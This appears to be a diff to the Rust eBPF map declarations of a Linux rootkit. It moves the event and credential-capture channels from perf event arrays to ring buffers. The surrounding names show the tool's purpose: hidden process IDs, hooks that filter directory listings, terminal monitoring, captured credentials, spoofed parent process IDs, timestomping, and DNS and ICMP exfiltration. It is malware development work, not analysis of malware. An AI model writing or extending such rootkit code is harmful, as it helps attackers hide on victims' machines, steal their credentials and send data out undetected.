@@ -1,10 +1,9 @@
 use aya_ebpf::{
     macros::map,
-    maps::{HashMap, PerCpuArray, PerfEventArray},
+    maps::{HashMap, PerCpuArray, RingBuf},
 };
 use common::{
-    ContainerProbeResult, CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload,
-    RootkitConfig, TimestompEntry,
+    ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, RootkitConfig, TimestompEntry,
 };
 
 #[map]
@@ -14,7 +13,7 @@ pub(crate) static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 
 pub(crate) static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);
 
 #[map]
-pub(crate) static EVENTS: PerfEventArray<EventHeader> = PerfEventArray::new(0);
+pub(crate) static EVENTS: RingBuf = RingBuf::with_byte_size(256 * 1024, 0);
 
 #[map]
 pub(crate) static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);
@@ -26,7 +25,7 @@ pub(crate) static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1
 pub(crate) static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);
 
 #[map]
-pub(crate) static CRED_EVENTS: PerfEventArray<CredentialCapture> = PerfEventArray::new(0);
+pub(crate) static CRED_EVENTS: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);
 
 #[map]
 pub(crate) static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);
